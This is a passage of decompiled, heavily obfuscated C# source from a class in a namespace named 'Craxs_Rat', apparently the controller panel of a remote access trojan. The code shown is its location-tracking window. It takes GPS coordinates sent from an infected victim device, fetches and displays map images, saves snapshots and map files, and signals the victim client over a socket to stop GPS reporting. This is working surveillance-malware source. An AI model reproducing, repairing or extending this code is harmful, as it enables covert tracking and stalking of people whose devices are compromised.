            ((Ports) this).Threadingg.IsBackground = true;
            num1 = (int) num2 * 281399838 ^ 1475826882;
            continue;
          case 9:
            strArray1 = str.Split('#');
            this.TextBox1.AppendText(EXGuarder.\u0036627205F);
            num1 = (int) num2 * -1614696010 ^ -1864489309;
            continue;
          case 10:
            strArray2 = strArray1;
            num1 = (int) num2 * 1617843586 ^ 204307812;
            continue;
          case 11:
            this.Map.ContextMenuStrip = this.ctxMenu;
            num1 = (int) num2 * -533793534 ^ -1471487577;
            continue;
          case 12:
            ((Ports) this).Threadingg = new Thread(new ThreadStart(this.Threadings));
            num1 = (int) num2 * -2081483493 ^ -844258996;
            continue;
          case 13:
            index = 0;
            num1 = (int) num2 * -1656200920 ^ -443432708;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      this.Text = ((Ports) this).Title;
      this.TOpacity.Interval = Settings.T_Interval;
      this.TOpacity.Enabled = true;
    }

    private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
    {
      MemoryStream memoryStream = new MemoryStream();
      AutoResetEvent userState = (AutoResetEvent) e.UserState;
      try
      {
        if (e.Cancelled)
          return;
label_2:
        int num1 = -434758616;
        byte[] result;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 * 564299343) ^ -(-248998263 - 463752966 - -1276991115 * -847707596))) % 6U)
          {
            case 0:
              goto label_2;
            case 1:
              result = e.Result;
              num1 = (int) num2 * -1046622413 ^ -1974645404;
              continue;
            case 2:
              int num3 = e.Error != null ? 1469355631 : (num3 = -1285024531);
              num1 = num3 ^ (int) num2 * 1567022804;
              continue;
            case 3:
              goto label_9;
            case 4:
              // ISSUE: variable of a reference type
              long& local;
              // ISSUE: reference to a compiler-generated field
              // ISSUE: explicit reference operation
              long num4 = checked (^(local = ref ((Craxs_Rat.sockets.Data) ((Craxs_Rat.sockets.Data._Closure\u0024__) ((Ports) this).classClient).MyServer).BytesReceived) + memoryStream.Length);
              local = num4;
              num1 = (int) num2 * 1476444478 ^ 1415400011;
              continue;
            case 5:
              memoryStream.Write(result, 0, result.Length);
              num1 = (int) num2 * -313609634 ^ 1612084574;
              continue;
            default:
              goto label_4;
          }
        }
label_9:
        return;
label_4:;
      }
      finally
      {
        if (memoryStream.Length <= 0L)
          goto label_16;
label_11:
        int num5 = 203931408;
label_12:
        Image image;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) (~(num5 * 564299343) ^ -(-248998263 - 463752966 - -1276991115 * -847707596))) % 5U)
          {
            case 0:
              goto label_16;
            case 1:
              image = Image.FromStream((Stream) memoryStream);
              num5 = (int) num6 * 205714399 ^ 1170954158;
              continue;
            case 2:
              this.MapView(image);
              num5 = (int) num6 * -1324756874 ^ 1105983651;
              continue;
            case 4:
              goto label_11;
            default:
              goto label_17;
          }
        }
label_17:
label_16:
        userState.Set();
        num5 = -1834335777;
        goto label_12;
      }
    }

    private void waiter1_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
    {
      this.Progress(e);
    }

    private void Progress(DownloadProgressChangedEventArgs e)
    {
      try
      {
        if (!this.InvokeRequired)
          goto label_6;
label_1:
        int num1 = -1475354294;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (17823143 - ((num2 ^ -(-522914172 - -(-896135246 - 185618958)) ^ (--2034441378 + (-1642175059 ^ 1684209341)) * -510577741 - (~(42223992 - 303573178) - (-1422331019 - 680005446 - ~600688740))) - (~~-872114085 - (-1613970973 - ~-1336383846)) - (355983035 - -1913785703 ^ ~1000791086) - 1115056268))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_12;
            case 2:
              goto label_6;
            case 3:
              int num4 = this.ProgressBar1.Value != this.ProgressBar1.Maximum ? 115465820 : (num4 = 696235302);
              num1 = num4 ^ (int) num3 * -1501082789;
              continue;
            case 4:
              goto label_7;
            case 5:
              this.ProgressBar1.Value = 0;
              num1 = (int) num3 * 1626529222 ^ -1115906119;
              continue;
            default:
              goto label_8;
          }
        }
label_12:
        return;
label_8:
        return;
label_7:
        // ISSUE: method pointer
        this.Invoke((Delegate) new LocationManager((object) this, __methodptr(Progress)), (object[]) new DownloadProgressChangedEventArgs[1]
        {
          e
        });
        return;
label_6:
        this.ProgressBar1.Value = e.ProgressPercentage;
        num1 = -1591531713;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_10:
        int num5 = -2004854178;
        while (true)
        {
          int num6 = num5;
          uint num7;
          switch ((num7 = (uint) (17823143 - ((num6 ^ -(-522914172 - -(-896135246 - 185618958)) ^ (--2034441378 + (-1642175059 ^ 1684209341)) * -510577741 - (~(42223992 - 303573178) - (-1422331019 - 680005446 - ~600688740))) - (~~-872114085 - (-1613970973 - ~-1336383846)) - (355983035 - -1913785703 ^ ~1000791086) - 1115056268))) % 3U)
          {
            case 0:
              goto label_10;
            case 1:
              goto label_3;
            case 2:
              ProjectData.ClearProjectError();
              num5 = (int) num7 * -1290742042 ^ 118498641;
              continue;
            default:
              goto label_14;
          }
        }
label_3:
        return;
label_14:;
      }
    }

    private void MapView(Image image)
    {
      try
      {
        if (this.InvokeRequired)
        {
label_1:
          int num1 = -296677716;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) --(-~num1 - (~(-1717776804 ^ 1082903708) - ---1487683937) ^ 514084842 * -168196121 + (650784316 - -1326389061))) % 4U)
            {
              case 0:
                goto label_1;
              case 1:
                goto label_6;
              case 2:
                this.Invoke((Delegate) new LocationManager.Delegate1(this.MapView), (object[]) new Image[1]
                {
                  image
                });
                num1 = (int) num2 * -381720211 ^ -211662461;
                continue;
              default:
                goto label_4;
            }
          }
label_6:
          return;
        }
label_4:
        this.Map.Image = image;
        this.Map.Invalidate();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Threadings()
    {
label_0:
      int num1 = -799263152;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~((num1 ^ ~-427633101 - (-(1959539417 * 1760100153 + (786715931 - -1784472147)) - 1067453915)) + (-(1903645996 + 1389367100) ^ -1565564997 - 1842799218 - -10025534) * 1002956625 - (526088804 - -1719854407 - (-830597946 - 1447124190)) * -485283641) - 768430270)) % 4U)
        {
          case 0:
            goto label_0;
          case 1:
label_2:
            num1 = -1522084689;
            continue;
          default:
label_17:
            Thread.Sleep(10);
label_18:
            int num3 = -1965307178;
            while (true)
            {
              uint num4;
              switch ((num4 = (uint) (-~((num3 ^ ~-427633101 - (-(1959539417 * 1760100153 + (786715931 - -1784472147)) - 1067453915)) + (-(1903645996 + 1389367100) ^ -1565564997 - 1842799218 - -10025534) * 1002956625 - (526088804 - -1719854407 - (-830597946 - 1447124190)) * -485283641) - 768430270)) % 3U)
              {
                case 0:
                  goto label_18;
                case 1:
                  if (((Ports) this).List.Count > 0)
                  {
                    num3 = (int) num4 * 1167246500 ^ -415552396;
                    continue;
                  }
                  goto label_2;
                default:
                  goto label_3;
              }
            }
label_3:
            try
            {
              ((Ports) this).Latitude = (double) ((Ports) this).List[0].GetValue(0);
label_4:
              int num5 = -1692679593;
              AutoResetEvent userToken;
              while (true)
              {
                uint num6;
                switch ((num6 = (uint) (-~((num5 ^ ~-427633101 - (-(1959539417 * 1760100153 + (786715931 - -1784472147)) - 1067453915)) + (-(1903645996 + 1389367100) ^ -1565564997 - 1842799218 - -10025534) * 1002956625 - (526088804 - -1719854407 - (-830597946 - 1447124190)) * -485283641) - 768430270)) % 8U)
                {
                  case 0:
                    goto label_4;
                  case 1:
                    this.waiter1.DownloadDataCompleted += new DownloadDataCompletedEventHandler(this.DownloadDataCallback);
                    Debug.WriteLine(this.FormatLink());
                    num5 = -1135727077;
                    continue;
                  case 2:
                    this.waiter1.DownloadDataAsync(new Uri(this.FormatLink()), (object) userToken);
                    userToken.WaitOne();
                    this.waiter1.Dispose();
                    num5 = (int) num6 * 2065941679 ^ -1727121830;
                    continue;
                  case 4:
                    this.waiter1.DownloadDataCompleted -= new DownloadDataCompletedEventHandler(this.DownloadDataCallback);
                    num5 = (int) num6 * -1207097723 ^ 1328394710;
                    continue;
                  case 5:
                    userToken = new AutoResetEvent(false);
                    int num7 = this.waiter1 == null ? -155022742 : (num7 = -895196503);
                    num5 = num7 ^ (int) num6 * 1732781240;
                    continue;
                  case 6:
                    ((Ports) this).Longitude = (double) ((Ports) this).List[0].GetValue(1);
                    num5 = (int) num6 * -916472932 ^ 722697494;
                    continue;
                  case 7:
                    ((Ports) this).List.RemoveAt(0);
                    num5 = (int) num6 * -1278915574 ^ 1339929230;
                    continue;
                  default:
                    goto label_17;
                }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
label_13:
              int num8 = 1860200323;
              while (true)
              {
                uint num9;
                switch ((num9 = (uint) (-~((num8 ^ ~-427633101 - (-(1959539417 * 1760100153 + (786715931 - -1784472147)) - 1067453915)) + (-(1903645996 + 1389367100) ^ -1565564997 - 1842799218 - -10025534) * 1002956625 - (526088804 - -1719854407 - (-830597946 - 1447124190)) * -485283641) - 768430270)) % 4U)
                {
                  case 1:
                    ProjectData.ClearProjectError();
                    num8 = (int) num9 * 412188781 ^ 2015916712;
                    continue;
                  case 2:
                    Debug.WriteLine(EXGuarder.\u00335702B5A);
                    num8 = (int) num9 * 120138158 ^ 2113984694;
                    continue;
                  case 3:
                    goto label_13;
                  default:
                    goto label_17;
                }
              }
            }
        }
      }
    }

    private string FormatLink()
    {
      string str1 = ((Ports) this).Markers;
label_1:
      int num1 = 93139312;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 ^ -~1456091911) ^ -(-870986228 - 1391411482) - -970074176)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str2 = string.Format(EXGuarder.\u0033E221A17, (object) ((Ports) this).Link, (object) ((Ports) this).style, (object) str1, (object) (Conversions.ToString(((Ports) this).Longitude) + EXGuarder.\u00307110B3B + Conversions.ToString(((Ports) this).Latitude) + EXGuarder.\u00317074923 + Conversions.ToString(((Ports) this).Longitude) + EXGuarder.\u00307110B3B + Conversions.ToString(((Ports) this).Latitude) + EXGuarder.\u00307110B3B + Conversions.ToString(((Ports) this).Zoom) + EXGuarder.\u0036D29085E + Conversions.ToString(((Ports) this).ImageSize.Width) + EXGuarder.\u0030A441E62 + Conversions.ToString(((Ports) this).ImageSize.Height)), (object) ((Ports) this).Key);
            num1 = (int) num2 * -1014641344 ^ 1279986667;
            continue;
          case 2:
            str1 = str1.Replace(EXGuarder.\u00368312700, Conversions.ToString(((Ports) this).Longitude)).Replace(EXGuarder.\u0033F486D2F, Conversions.ToString(((Ports) this).Latitude));
            num1 = (int) num2 * 1287625519 ^ 1847302539;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str2;
    }

    private void NextZoom()
    {
      // ISSUE: variable of a reference type
      int& local;
      // ISSUE: explicit reference operation
      int num1 = checked (^(local = ref ((Ports) this).Zoom) + 1);
      local = num1;
label_1:
      int num2 = -94106077;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (-((-~num2 - 251087752 * 77844065) * 2035321963) ^ -2023486702)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            ((Ports) this).List.Add((Array) new double[2]
            {
              ((Ports) this).Latitude,
              ((Ports) this).Longitude
            });
            num2 = -1872270271;
            continue;
          case 2:
            ((Ports) this).Zoom = 21;
            num2 = (int) num3 * -198804905 ^ 1059572716;
            continue;
          case 3:
            int num4 = ((Ports) this).Zoom < 21 ? 1197620331 : (num4 = -1229226090);
            num2 = num4 ^ (int) num3 * -1162049042;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void BackZoom()
    {
      // ISSUE: variable of a reference type
      int& local;
      // ISSUE: explicit reference operation
      int num1 = checked (^(local = ref ((Ports) this).Zoom) - 1);
      local = num1;
      if (((Ports) this).Zoom > 1)
        goto label_5;
label_1:
      int num2 = 1043869605;
label_2:
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (~(~~num2 + (1631833029 + ~(521721757 ^ -118954500))) + (1189663493 - 1090473466))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            ((Ports) this).Zoom = 1;
            num2 = (int) num3 * -1527467835 ^ -1311367294;
            continue;
          case 3:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      ((Ports) this).List.Add((Array) new double[2]
      {
        ((Ports) this).Latitude,
        ((Ports) this).Longitude
      });
      num2 = 579638250;
      goto label_2;
    }

    private void Map_MouseWheel(object sender, MouseEventArgs e)
    {
      if (e.Delta >= 0)
        goto label_6;
label_1:
      int num1 = -1755457217;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 ^ --2118027596 - ((-627201737 ^ ~-2668875 ^ -791841320 ^ -161455750 - 1449663490) + ((-839172977 - -438924871) * -75293751 - (1468412402 - 1397206315 - (285487632 - -1621019533))))) * 863671305 * -1503516313)) % 6U)
        {
          case 0:
            goto label_6;
          case 1:
            num1 = (int) num2 * -952545618 ^ -998826853;
            continue;
          case 2:
            this.BackZoom();
            num1 = (int) num2 * 1967524158 ^ 812463558;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_3;
          case 5:
            this.NextZoom();
            num1 = (int) num2 * 886855382 ^ 1935698667;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_6:
      num1 = e.Delta <= 0 ? -1252822867 : (num1 = 1452374874);
      goto label_2;
    }

    private void Map_KeyDown(object sender, KeyEventArgs e)
    {
      if (e.KeyData != Keys.Up)
        goto label_6;
label_1:
      int num1 = -362608182;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(-num1 + ((-431904985 ^ -1361663015) + 1681574090 ^ -457107441 ^ 1778896899 * ~(-417009596 ^ -863456491)) ^ 1166887242 + 786265005 - (121820642 - 2135071206) ^ 1578323618 - -118896309 ^ -1091536209 ^ 984728504) * -520801847 - 692036337)) % 6U)
        {
          case 0:
            goto label_6;
          case 1:
            num1 = (int) num2 * 833212370 ^ -391389961;
            continue;
          case 2:
            this.NextZoom();
            num1 = (int) num2 * -311499841 ^ 1527382277;
            continue;
          case 3:
            this.BackZoom();
            num1 = (int) num2 * -416839744 ^ -831696379;
            continue;
          case 4:
            goto label_1;
          case 5:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_6:
      num1 = e.KeyData != Keys.Down ? 1106467141 : (num1 = 888394893);
      goto label_2;
    }

    private void LocationManager_Closing(object sender, CancelEventArgs e)
    {
      if (!((Ports) this).Issilent)
      {
label_1:
        int num1 = 334343307;
        object[] ParametersObjects;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~~(num1 * -2132092895 + 1858056001 * ((1257999445 * -1440618191 ^ ~-1911220950) * -2076762093)) - 1991693528 * 595274251)) % 4U)
          {
            case 1:
              if (((Ports) this).classClient != null)
              {
                num1 = (int) num2 * -1313285388 ^ -980300615;
                continue;
              }
              goto label_7;
            case 2:
              goto label_1;
            case 3:
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((Ports) this).Client,
                (object) (Craxs_Rat.sockets.Client.KeysClient4 + Craxs_Rat.sockets.Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0036F756902),
                (object) ((Ports) this).classClient
              };
              num1 = (int) num2 * 767440678 ^ -2021318386;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        // ISSUE: reference to a compiler-generated field
        ((Craxs_Rat.sockets.Data._Closure\u0024__39\u002D9) ((Ports) this).classClient).qitGPS = true;
        ((Ports) this).classClient.SendMessage(ParametersObjects);
      }
label_7:
      try
      {
        ((Ports) this).Threadingg.Abort();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Map_MouseDoubleClick(object sender, MouseEventArgs e) => this.MapBOX();

    private void MapBOX()
    {
      try
      {
        if (((Ports) this).infoMaps.Length <= 0)
          return;
label_1:
        int num1 = 2049245260;
        while (true)
        {
          int num2 = num1;
          uint num3;
          string path;
          string str;
          string contents;
          switch ((num3 = (uint) (((1675206444 - 2093130401) * 335122881 - (941061928 + 701714330 ^ -462940472 ^ 1831977619) + -366086581 * (1417926777 - -377462627 - --1374771023) - (num2 + (550753367 ^ ~(-1932276744 ^ --303032626) ^ (--299224609 ^ -1869429217 ^ -235084936) - (--422118497 - 1572663539) + ((608691417 ^ 639565363) - (1700556486 - 822951935) ^ ~~-418441141)))) * -476321213)) % 10U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = !Directory.Exists(((Ports) this).infoMaps[0]) ? 1861709292 : (num4 = -352690197);
              num1 = num4 ^ (int) num3 * -253398745;
              continue;
            case 2:
              goto label_13;
            case 3:
              path = ((Ports) this).infoMaps[0] + EXGuarder.\u003643F6A03;
              num1 = (int) num3 * -2001230922 ^ 1636909337;
              continue;
            case 4:
              str = path + EXGuarder.\u003713E3805 + DateAndTime.Now.ToString(EXGuarder.\u003485A6556) + EXGuarder.\u0031616553E;
              num1 = (int) num3 * -1168743051 ^ 961263884;
              continue;
            case 5:
              Directory.CreateDirectory(path);
              num1 = (int) num3 * -1295468667 ^ 1415997080;
              continue;
            case 6:
              int num5 = Directory.Exists(path) ? 1601938073 : (num5 = 1827954672);
              num1 = num5 ^ (int) num3 * 1938940978;
              continue;
            case 7:
              contents = contents.Replace(EXGuarder.\u003190B4960, ((Ports) this).Key).Replace(EXGuarder.\u00311177764, EXGuarder.\u00322764877 + ((Ports) this).style).Replace(EXGuarder.\u0032C4E6B4C, Conversions.ToString(((Ports) this).Longitude) + EXGuarder.\u00335393334 + Conversions.ToString(((Ports) this).Latitude)).Replace(EXGuarder.\u003434E5D73, ((Ports) this).infoMaps[1]);
              num1 = (int) num3 * 1422498626 ^ -409214121;
              continue;
            case 8:
              contents = Craxs_Rat.My.Resources.Resources.map;
              num1 = 2082361304;
              continue;
            case 9:
              System.IO.File.WriteAllText(str, contents);
              Process.Start(str);
              num1 = (int) num3 * -1608551895 ^ -904636996;
              continue;
            default:
              goto label_14;
          }
        }
label_13:
        return;
label_14:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Map_MouseHover(object sender, System.EventArgs e)
    {
      ((Ports) this).MouseState = true;
label_1:
      int num1 = -461201688;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~((-num1 ^ 1077446714 - 545938647 + ~-1698347894 - (-728392429 - (969031982 - 788149543)) - ~~(1553506605 + 622044737)) * -2118633115) ^ -1313208488)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Map.Invalidate();
            num1 = (int) num2 * -879730561 ^ 1804894802;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void Map_MouseLeave(object sender, System.EventArgs e)
    {
      ((Ports) this).MouseState = false;
      this.Map.Invalidate();
    }

    private void Map_Paint(object sender, PaintEventArgs e)
    {
      if (!(((Ports) this).MouseState & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(((Ports) this).Accuracy, EXGuarder.\u00345563030, false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(((Ports) this).Speed, EXGuarder.\u00345563030, false) != 0))
        return;
label_1:
      int num1 = -1231109780;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 - ~(~~-1767287956 ^ (-323054174 ^ 1908818258) - 29388596 ^ 715535437 * (-127951064 ^ -856408276) - -8448119 * (1478386614 * 844517033))) * -1719751881)) % 6U)
        {
          case 0:
            SizeF sizeF1 = new SizeF();
            num1 = (int) num2 * 1625805305 ^ 1897624857;
            continue;
          case 1:
            goto label_8;
          case 2:
            goto label_1;
          case 3:
            SizeF sizeF2 = e.Graphics.MeasureString(str, Settings.f);
            Rectangle rect = new Rectangle(5, 5, checked ((int) Math.Round((double) sizeF2.Width)), checked ((int) Math.Round((double) sizeF2.Height)));
            Color defaultColorBackground = Settings.DefaultColor_Background;
            e.Graphics.FillRectangle(new Pen(Color.FromArgb(200, (int) defaultColorBackground.R, (int) defaultColorBackground.G, (int) defaultColorBackground.B)).Brush, rect);
            num1 = (int) num2 * 333159225 ^ 577799088;
            continue;
          case 4:
            str = string.Format(EXGuarder.\u0030A012F04, (object) ((Ports) this).Accuracy, (object) ((Ports) this).Speed);
            num1 = (int) num2 * -2100415580 ^ 1860075594;
            continue;
          case 5:
            e.Graphics.DrawString(str, Settings.f, (Brush) new SolidBrush(getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground), 5f, 5f);
            num1 = (int) num2 * -1868034054 ^ 359448563;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void OpenUsingGoogleMapsToolStripMenuItem_Click(object sender, System.EventArgs e)
    {
      Process.Start(string.Format(EXGuarder.\u00303693A29, (object) Conversions.ToString(((Ports) this).Latitude), (object) Conversions.ToString(((Ports) this).Longitude), (object) Conversions.ToString(((Ports) this).Latitude), (object) Conversions.ToString(((Ports) this).Longitude), (object) EXGuarder.\u0036B692318));
    }

    private void OpenUsingMapBoxToolStripMenuItem_Click(object sender, System.EventArgs e)
    {
      this.MapBOX();
    }

    private void Savetimer_Tick(object sender, System.EventArgs e)
    {
      string path = ((Ports) this).tmpFolderUSER + EXGuarder.\u0030673754B;
label_1:
      int num1 = -485654386;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(-(~num1 * -1845642371 * 1182287979) - 839712137 * 599363915)) % 10U)
        {
          case 0:
            int num3;
            num1 = num3 = !Directory.Exists(path) ? -538730868 : (num3 = -1759245935);
            continue;
          case 1:
            num1 = (int) num2 * -1604070740 ^ 1342887192;
            continue;
          case 2:
            this.Map.Image.Save(path + EXGuarder.\u00341157371 + DateAndTime.Now.ToString(EXGuarder.\u003313B4B2B) + EXGuarder.\u00377116945, ImageFormat.Jpeg);
            num1 = (int) num2 * 1497269528 ^ 946379308;
            continue;
          case 3:
            goto label_3;
          case 4:
            Directory.CreateDirectory(path);
            num1 = (int) num2 * -806284347 ^ -1298501861;
            continue;
          case 5:
            goto label_1;
          case 6:
            this.savetimer.Dispose();
            num1 = (int) num2 * 2126633053 ^ 1484087848;
            continue;
          case 7:
            int num4 = !((Ports) this).boSave ? 2135107912 : (num4 = 1661150543);
            num1 = num4 ^ (int) num2 * -2109862717;
            continue;
          case 8:
            this.savetimer.Stop();
            num1 = 914629457;
            continue;
          case 9:
            int num5 = Directory.Exists(path) ? -1884297711 : (num5 = 882500735);
            num1 = num5 ^ (int) num2 * 944695138;
            continue;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:;
    }

    private void DrakeUICheckBox1_ValueChanged(object sender, bool value)
    {
      if (this.Map.Image == null)
        return;
label_1:
      int num1 = -1748690118;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str;
        switch ((num3 = (uint) ((886153946 - -1503131199 - ~(~~~-543289294 - -~num2)) * 225281839)) % 12U)
        {
          case 0:
            int num4 = Directory.Exists(str) ? 1396826725 : (num4 = 1674470164);
            num1 = num4 ^ (int) num3 * 378245556;
            continue;
          case 1:
            goto label_14;
          case 2:
            Directory.CreateDirectory(str);
            num1 = (int) num3 * 1466484875 ^ -1158658913;
            continue;
          case 3:
            goto label_1;
          case 4:
            str = ((Ports) this).tmpFolderUSER + EXGuarder.\u0035E376078;
            num1 = (int) num3 * -1963757115 ^ 1389245962;
            continue;
          case 5:
            this.savetimer.Stop();
            num1 = 1357195692;
            continue;
          case 6:
            ((Ports) this).boSave = false;
            num1 = (int) num3 * -810447662 ^ -1446571489;
            continue;
          case 7:
            num1 = (int) num3 * 816561919 ^ 340623802;
            continue;
          case 8:
            int num5 = !this.DrakeUICheckBox1.Checked ? -1739914717 : (num5 = 1694548367);
            num1 = num5 ^ (int) num3 * 937622519;
            continue;
          case 9:
            this.savetimer.Start();
            num1 = (int) num3 * 1224564027 ^ 152246191;
            continue;
          case 10:
            ((Ports) this).boSave = true;
            num1 = (int) num3 * 790241127 ^ -1663876168;
            continue;
          case 11:
            Process.Start(str);
            num1 = 1417741997;
            continue;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void SaveToolStripMenuItem_Click(object sender, System.EventArgs e)
    {
      try
      {
        if (((Ports) this).infoMaps.Length <= 0)
          return;
label_1:
        int num1 = -901744813;
        while (true)
        {
          int num2 = num1;
          uint num3;
          string path;
          string contents;
          switch ((num3 = (uint) (~-284542520 - (~((num2 ^ -(~(-297465229 - -1717651417) + -(1311923271 * -1115277665) ^ -(-772424291 ^ -608574029) ^ ~-1059296956 - -1050482782)) - (-((-625638851 ^ -1754044011) - (-117778605 - -962914230)) ^ -~993620544)) - (318043907 ^ -1811573540 ^ -374235514 * -1388082233)))) % 8U)
          {
            case 0:
              goto label_11;
            case 1:
              int num4 = !Directory.Exists(((Ports) this).infoMaps[0]) ? -93688621 : (num4 = -511779079);
              num1 = num4 ^ (int) num3 * 453408511;
              continue;
            case 2:
              goto label_1;
            case 3:
              System.IO.File.WriteAllText(path + EXGuarder.\u0036104635F + DateAndTime.Now.ToString(EXGuarder.\u0030E3F3D44) + EXGuarder.\u00339324226, contents);
              num1 = (int) num3 * -1926262010 ^ 361188582;
              continue;
            case 4:
              int num5 = Directory.Exists(path) ? 1767362361 : (num5 = -1034552573);
              num1 = num5 ^ (int) num3 * -671447063;
              continue;
            case 5:
              Directory.CreateDirectory(path);
              num1 = (int) num3 * -1675202540 ^ -493462727;
              continue;
            case 6:
              path = ((Ports) this).infoMaps[0] + EXGuarder.\u00357372023;
              num1 = (int) num3 * 864344826 ^ -1826509388;
              continue;
            case 7:
              contents = Craxs_Rat.My.Resources.Resources.map.Replace(EXGuarder.\u0031A2F2A71, ((Ports) this).Key).Replace(EXGuarder.\u0031853043B, EXGuarder.\u00300163E35 + ((Ports) this).style).Replace(EXGuarder.\u003105D652E, Conversions.ToString(((Ports) this).Longitude) + EXGuarder.\u0034F3D096F + Conversions.ToString(((Ports) this).Latitude)).Replace(EXGuarder.\u0032C3F0704, ((Ports) this).infoMaps[1]);
              num1 = -862812399;
              continue;
            default:
              goto label_12;
          }
        }
label_11:
        return;
label_12:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void SaveAsToolStripMenuItem_Click(object sender, System.EventArgs e)
    {
      try
      {
        if (((Ports) this).infoMaps.Length <= 0)
          return;
label_1:
        int num1 = 727997820;
        while (true)
        {
          int num2 = num1;
          uint num3;
          string contents;
          SaveFileDialog saveFileDialog;
          switch ((num3 = (uint) (254948627 + 212279951 - ~-(~~((-1854225755 ^ -2008599555) + 1890906364 ^ ~(389931744 - 854373755)) - num2) * 834487897 - -1086839199)) % 7U)
          {
            case 0:
              saveFileDialog = new SaveFileDialog();
              saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u0034F6B762A) + EXGuarder.\u00323570773;
              num1 = (int) num3 * -932240054 ^ -828556610;
              continue;
            case 1:
              string str = ((Ports) this).infoMaps[0] + EXGuarder.\u003393D4751;
              contents = Craxs_Rat.My.Resources.Resources.map.Replace(EXGuarder.\u003683A2824, ((Ports) this).Key).Replace(EXGuarder.\u0030D431811, EXGuarder.\u00341655539 + ((Ports) this).style).Replace(EXGuarder.\u0032E160F76, Conversions.ToString(((Ports) this).Longitude) + EXGuarder.\u00367571C10 + Conversions.ToString(((Ports) this).Latitude)).Replace(EXGuarder.\u00365146C36, ((Ports) this).infoMaps[1]);
              num1 = (int) num3 * -1134504822 ^ 1757704589;
              continue;
            case 2:
              goto label_10;
            case 3:
              goto label_1;
            case 4:
              System.IO.File.WriteAllText(saveFileDialog.FileName, contents);
              num1 = (int) num3 * -1059175422 ^ 414201095;
              continue;
            case 5:
              saveFileDialog.Filter = EXGuarder.\u0030E790B43;
              int num4 = saveFileDialog.ShowDialog() != DialogResult.OK ? 422355089 : (num4 = -1943199721);
              num1 = num4 ^ (int) num3 * -1046102826;
              continue;
            case 6:
              saveFileDialog.Dispose();
              num1 = 222319694;
              continue;
            default:
              goto label_11;
          }
        }
label_10:
        return;
label_11:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern LocationManager(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      DownloadProgressChangedEventArgs e,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void Delegate1(DownloadProgressChangedEventArgs e);

    public delegate void Delegate0(Image image);
  }
}
